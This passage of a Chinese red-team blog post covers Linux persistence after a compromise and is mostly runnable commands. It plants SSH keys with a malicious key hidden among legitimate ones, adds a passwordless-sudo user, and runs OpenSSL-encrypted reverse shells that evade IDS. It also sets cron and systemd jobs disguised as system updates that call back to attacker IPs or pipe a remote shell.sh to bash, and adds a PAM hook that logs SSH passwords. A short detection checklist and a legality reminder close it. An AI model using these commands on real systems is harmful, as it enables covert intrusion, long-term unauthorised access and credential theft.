+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方法1：使用 ssh-copy-id（需要密码）</span></span><br><span class="line">ssh-copy-id -i ~/.ssh/id_rsa.pub root@192.168.227.136</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法2：手动追加（已有 Shell 权限）</span></span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/id_rsa.pub | ssh root@192.168.227.136 <span class="string">&quot;mkdir -p ~/.ssh &amp;&amp; cat &gt;&gt; ~/.ssh/authorized_keys&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法3：直接写入（WebShell 场景）</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC...&quot;</span> &gt;&gt; /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 设置正确的权限</strong>（重要）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 700 ~/.ssh</span><br><span class="line"><span class="built_in">chmod</span> 600 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p><strong>权限说明</strong>：</p>
+<ul>
+<li><code>.ssh</code> 目录必须是 <code>700</code>（仅所有者可读写执行）</li>
+<li><code>authorized_keys</code> 文件必须是 <code>600</code>（仅所有者可读写）</li>
+<li>权限错误会导致 SSH 拒绝公钥认证</li>
+</ul>
+<p><strong>4. 免密登录</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i ~/.ssh/id_rsa root@192.168.227.136</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="隐蔽性优化-1"><a href="#隐蔽性优化-1" class="headerlink" title="隐蔽性优化"></a>隐蔽性优化</h3><p><strong>1. 使用非标准密钥名称</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -f ~/.ssh/backup_key</span><br><span class="line">ssh -i ~/.ssh/backup_key root@192.168.227.136</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 添加多个公钥</strong>（混淆检测）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 authorized_keys 中添加多个公钥，恶意公钥混在中间</span></span><br><span class="line"><span class="built_in">cat</span> legitimate_key.pub &gt;&gt; ~/.ssh/authorized_keys</span><br><span class="line"><span class="built_in">cat</span> malicious_key.pub &gt;&gt; ~/.ssh/authorized_keys</span><br><span class="line"><span class="built_in">cat</span> another_legitimate_key.pub &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 修改 SSH 配置允许 root 登录</strong>（如果被禁用）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编辑 /etc/ssh/sshd_config</span></span><br><span class="line">PermitRootLogin <span class="built_in">yes</span></span><br><span class="line">PubkeyAuthentication <span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启 SSH 服务</span></span><br><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></figure>
+
+<p><strong>4. 使用低权限用户 + sudo 提权</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建普通用户</span></span><br><span class="line">useradd -m -s /bin/bash backup</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;backup:RandomPass123&quot;</span> | chpasswd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加 sudo 权限（无需密码）</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;backup ALL=(ALL) NOPASSWD: ALL&quot;</span> &gt;&gt; /etc/sudoers</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传公钥到该用户</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /home/backup/.ssh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3...&quot;</span> &gt;&gt; /home/backup/.ssh/authorized_keys</span><br><span class="line"><span class="built_in">chown</span> -R backup:backup /home/backup/.ssh</span><br><span class="line"><span class="built_in">chmod</span> 700 /home/backup/.ssh</span><br><span class="line"><span class="built_in">chmod</span> 600 /home/backup/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="加密反弹-Shell"><a href="#加密反弹-Shell" class="headerlink" title="加密反弹 Shell"></a>加密反弹 Shell</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>传统的反弹 Shell 流量是明文传输，容易被 IDS&#x2F;IPS 检测。使用 OpenSSL 加密反弹 Shell 可以绕过流量检测，同时保证通信安全。</p>
+<h3 id="实现步骤-2"><a href="#实现步骤-2" class="headerlink" title="实现步骤"></a>实现步骤</h3><p><strong>1. 在攻击机生成 SSL 证书</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure>
+
+<p><strong>参数说明</strong>：</p>
+<ul>
+<li><code>-x509</code>：生成自签名证书</li>
+<li><code>-newkey rsa:4096</code>：生成 4096 位 RSA 密钥</li>
+<li><code>-keyout</code>：私钥文件名</li>
+<li><code>-out</code>：证书文件名</li>
+<li><code>-days 365</code>：证书有效期 365 天</li>
+<li><code>-nodes</code>：不加密私钥（避免输入密码）</li>
+</ul>
+<p><strong>2. 在攻击机启动 SSL 监听</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 2024</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 在目标主机执行加密反弹 Shell</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkfifo</span> /tmp/revshell; /bin/bash -i &lt; /tmp/revshell 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.1.155:2024 &gt; /tmp/revshell; <span class="built_in">rm</span> -f /tmp/revshell</span><br></pre></td></tr></table></figure>
+
+<p><strong>命令解析</strong>：</p>
+<ul>
+<li><code>mkfifo /tmp/revshell</code>：创建命名管道</li>
+<li><code>/bin/bash -i</code>：启动交互式 Bash</li>
+<li><code>&lt; /tmp/revshell</code>：从管道读取输入</li>
+<li><code>2&gt;&amp;1</code>：重定向标准错误到标准输出</li>
+<li><code>| openssl s_client</code>：通过 SSL 连接发送输出</li>
+<li><code>&gt; /tmp/revshell</code>：将接收的数据写回管道</li>
+<li><code>rm -f /tmp/revshell</code>：执行完毕后删除管道</li>
+</ul>
+<hr>
+<h3 id="持久化部署"><a href="#持久化部署" class="headerlink" title="持久化部署"></a>持久化部署</h3><p><strong>方法1：添加到 Cron 任务</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 每 5 分钟尝试连接一次</span></span><br><span class="line">(crontab -l 2&gt;/dev/null; <span class="built_in">echo</span> <span class="string">&quot;*/5 * * * * mkfifo /tmp/.s; /bin/bash -i &lt; /tmp/.s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.1.155:2024 &gt; /tmp/.s; rm -f /tmp/.s&quot;</span>) | crontab -</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法2：添加到 systemd 服务</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建服务文件</span></span><br><span class="line"><span class="built_in">cat</span> &gt; /etc/systemd/system/system-update.service &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[Unit]</span></span><br><span class="line"><span class="string">Description=System Update Service</span></span><br><span class="line"><span class="string">After=network.target</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Service]</span></span><br><span class="line"><span class="string">Type=simple</span></span><br><span class="line"><span class="string">ExecStart=/bin/bash -c &#x27;while true; do mkfifo /tmp/.s; /bin/bash -i &lt; /tmp/.s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.1.155:2024 &gt; /tmp/.s; rm -f /tmp/.s; sleep 300; done&#x27;</span></span><br><span class="line"><span class="string">Restart=always</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Install]</span></span><br><span class="line"><span class="string">WantedBy=multi-user.target</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启用服务</span></span><br><span class="line">systemctl <span class="built_in">enable</span> system-update.service</span><br><span class="line">systemctl start system-update.service</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Cron-任务持久化"><a href="#Cron-任务持久化" class="headerlink" title="Cron 任务持久化"></a>Cron 任务持久化</h2><h3 id="基础利用-1"><a href="#基础利用-1" class="headerlink" title="基础利用"></a>基础利用</h3><p><strong>1. 用户级 Cron 任务</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 每小时执行一次</span></span><br><span class="line">(crontab -l 2&gt;/dev/null; <span class="built_in">echo</span> <span class="string">&quot;0 * * * * /tmp/.update.sh&quot;</span>) | crontab -</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每 10 分钟执行一次</span></span><br><span class="line">(crontab -l 2&gt;/dev/null; <span class="built_in">echo</span> <span class="string">&quot;*/10 * * * * curl http://192.168.1.100/shell.sh | bash&quot;</span>) | crontab -</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每天凌晨 3 点执行</span></span><br><span class="line">(crontab -l 2&gt;/dev/null; <span class="built_in">echo</span> <span class="string">&quot;0 3 * * * /usr/local/bin/backup.sh&quot;</span>) | crontab -</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 系统级 Cron 任务</strong>（需要 root 权限）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加到 /etc/crontab</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;*/15 * * * * root /bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1&#x27;&quot;</span> &gt;&gt; /etc/crontab</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加到 /etc/cron.d/</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;*/10 * * * * root /usr/bin/python3 /opt/monitor.py&quot;</span> &gt; /etc/cron.d/system-monitor</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="隐蔽性优化-2"><a href="#隐蔽性优化-2" class="headerlink" title="隐蔽性优化"></a>隐蔽性优化</h3><p><strong>1. 使用隐藏文件名</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文件名以 . 开头（ls 默认不显示）</span></span><br><span class="line">(crontab -l 2&gt;/dev/null; <span class="built_in">echo</span> <span class="string">&quot;*/5 * * * * /tmp/.systemd-update&quot;</span>) | crontab -</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 伪装成系统任务</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 任务名称和路径模仿系统组件</span></span><br><span class="line">(crontab -l 2&gt;/dev/null; <span class="built_in">echo</span> <span class="string">&quot;0 */6 * * * /usr/lib/systemd/systemd-update-check&quot;</span>) | crontab -</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 输出重定向到 &#x2F;dev&#x2F;null</strong>（避免邮件告警）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab -l 2&gt;/dev/null; <span class="built_in">echo</span> <span class="string">&quot;*/10 * * * * /tmp/backdoor.sh &gt; /dev/null 2&gt;&amp;1&quot;</span>) | crontab -</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="其他-Linux-持久化方法"><a href="#其他-Linux-持久化方法" class="headerlink" title="其他 Linux 持久化方法"></a>其他 Linux 持久化方法</h2><h3 id="1-修改-etc-rc-local"><a href="#1-修改-etc-rc-local" class="headerlink" title="1. 修改 &#x2F;etc&#x2F;rc.local"></a>1. 修改 &#x2F;etc&#x2F;rc.local</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在系统启动时执行</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/usr/local/bin/startup.sh &amp;&quot;</span> &gt;&gt; /etc/rc.local</span><br><span class="line"><span class="built_in">chmod</span> +x /etc/rc.local</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-添加-systemd-服务"><a href="#2-添加-systemd-服务" class="headerlink" title="2. 添加 systemd 服务"></a>2. 添加 systemd 服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; /etc/systemd/system/network-monitor.service &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[Unit]</span></span><br><span class="line"><span class="string">Description=Network Monitor Service</span></span><br><span class="line"><span class="string">After=network.target</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Service]</span></span><br><span class="line"><span class="string">Type=forking</span></span><br><span class="line"><span class="string">ExecStart=/usr/local/bin/monitor.sh</span></span><br><span class="line"><span class="string">Restart=always</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Install]</span></span><br><span class="line"><span class="string">WantedBy=multi-user.target</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">systemctl <span class="built_in">enable</span> network-monitor.service</span><br><span class="line">systemctl start network-monitor.service</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-修改-bashrc-bash-profile"><a href="#3-修改-bashrc-bash-profile" class="headerlink" title="3. 修改 .bashrc &#x2F; .bash_profile"></a>3. 修改 .bashrc &#x2F; .bash_profile</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在用户登录时执行</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nohup /tmp/.update.sh &gt; /dev/null 2&gt;&amp;1 &amp;&quot;</span> &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-PAM-后门"><a href="#4-PAM-后门" class="headerlink" title="4. PAM 后门"></a>4. PAM 后门</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改 PAM 配置记录所有 SSH 密码</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;auth optional pam_exec.so quiet expose_authtok /usr/local/bin/log_password.sh&quot;</span> &gt;&gt; /etc/pam.d/sshd</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="权限维持最佳实践"><a href="#权限维持最佳实践" class="headerlink" title="权限维持最佳实践"></a>权限维持最佳实践</h1><h2 id="红队建议"><a href="#红队建议" class="headerlink" title="红队建议"></a>红队建议</h2><ol>
+<li><strong>多重持久化</strong>：部署 2-3 种不同的持久化方法，避免单点失效</li>
+<li><strong>定期回连测试</strong>：验证持久化机制是否仍然有效</li>
+<li><strong>隐蔽性优先</strong>：避免高频执行和明显的恶意特征</li>
+<li><strong>及时清理</strong>：任务完成后清除所有持久化痕迹</li>
+<li><strong>应急预案</strong>：准备备用的访问通道</li>
+</ol>
+<h2 id="蓝队检测"><a href="#蓝队检测" class="headerlink" title="蓝队检测"></a>蓝队检测</h2><ol>
+<li><p><strong>监控关键位置</strong>：</p>
+<ul>
+<li>Windows：计划任务、WMI 订阅、注册表自启动项</li>
+<li>Linux：Cron 任务、systemd 服务、SSH 密钥</li>
+</ul>
+</li>
+<li><p><strong>行为分析</strong>：</p>
+<ul>
+<li>异常的网络连接（特别是定时连接）</li>
+<li>非标准路径的程序执行</li>
+<li>SYSTEM&#x2F;root 权限的可疑进程</li>
+</ul>
+</li>
+<li><p><strong>定期审计</strong>：</p>
+<ul>
+<li>检查 authorized_keys 文件</li>
+<li>审计计划任务和服务</li>
+<li>分析启动项和自启动程序</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>权限维持是内网渗透的关键环节，成功的持久化依赖于：</p>
+<ol>
+<li><strong>隐蔽性</strong>：伪装成系统组件，降低被发现的风险</li>
+<li><strong>稳定性</strong>：选择可靠的触发机制，确保长期有效</li>
+<li><strong>多样性</strong>：部署多种持久化方法，提高容错能力</li>
+<li><strong>可控性</strong>：保留清理和更新持久化机制的能力</li>
+</ol>
+<p>记住：权限维持技术需要在授权的渗透测试环境中使用，未经授权的持久化行为属于违法行为。</p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">权限维持</a><a class="post-meta__tags" href="/tags/%E6%8C%81%E4%B9%85%E5%8C%96%E6%8A%80%E6%9C%AF/">持久化技术</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/02/13/nw2/" title="内网横向移动技术"><img class="cover" src="/img/covers/shinchan-cover-09.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post" loading='lazy'><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">内网横向移动技术</div></div><div class="info-2"><div class="info-item-1">横向移动概述在内网渗透中，当攻击者获取到内网某台机器的控制权后，会以被攻陷的主机为跳板，通过收集域内凭证、利用服务漏洞、滥用系统特性等方法，访问域内其他机器，进一步扩大资产范围。 横向移动的最终目标通常是获得域控制器的访问权限，从而完全控制基于 Windows 的整个内网环境。  横向移动的四大维度 漏洞利用：利用操作系统或服务的已知漏洞（如 MS17-010、CVE-2019-0708） 服务利用：滥用合法的 Windows 服务（如 SMB、WMI、WinRM、PSEXEC） 令牌横向：窃取和滥用访问令牌实现权限提升和横向 软件部署利用：利用企业部署工具（如 SCCM、GPO）进行批量横向   漏洞利用横向MS17-010（永恒之蓝）漏洞概述MS17-010 是 SMB 协议的远程代码执行漏洞，影响 Windows XP 至 Windows Server 2016 的多个版本。该漏洞无需认证即可触发，危害极大。 利用注意事项警告：MS17-010 利用可能导致目标系统蓝屏崩溃，在生产环境中需谨慎使用。 安全利用方法使用 MSF 的命令执行模块（不会蓝屏）： 1234use a...</div></div></div></a><a class="pagination-related" href="/2026/02/13/tq/" title="Windows/Linux 提权技术实战"><img class="cover" src="/img/covers/shinchan-cover-04.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post" loading='lazy'><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Windows/Linux 提权技术实战</div></div><div class="info-2"><div class="info-item-1">Windows 提权技术在 Windows 系统中获取初始访问权限后，通常需要将权限提升至 SYSTEM 或管理员级别，以便执行更深入的渗透操作。以下是常见的 Windows 提权技术。  土豆家族提权原理概述“土豆家族”是一系列利用 Windows 本地权限提升漏洞的技术集合，核心原理是滥用 Windows 的 NTLM 认证机制和 COM 对象，诱骗 SYSTEM 权限的进程向攻击者控制的服务进行身份验证，从而窃取 SYSTEM 令牌。  土豆家族演进   技术名称 适用系统 核心原理 利用条件    Hot Potato Windows 7&#x2F;8&#x2F;10&#x2F;Server 2008&#x2F;2012 NBNS 欺骗 + NTLM 中继 SeImpersonate 或 SeAssignPrimaryToken 权限   Rotten Potato Windows 7&#x2F;8&#x2F;10&#x2F;Server 2008&#x2F;2012&#x2F;2016 COM 对象劫持 + NTLM 中继 SeImpersonate 或 SeAssig...</div></div></div></a></nav></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Kenny</span></div><div class="footer_custom_text"><div class="footer-links"><a class="footer-link" href="https://yyyxxx.cc" target="_blank" rel="noopener noreferrer">友情链接：映雪安全</a><a class="footer-link" href="https://qm.qq.com/q/QNgesnj1aU" target="_blank" rel="noopener noreferrer">QQ群：点击加群</a></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div></div></body></html>
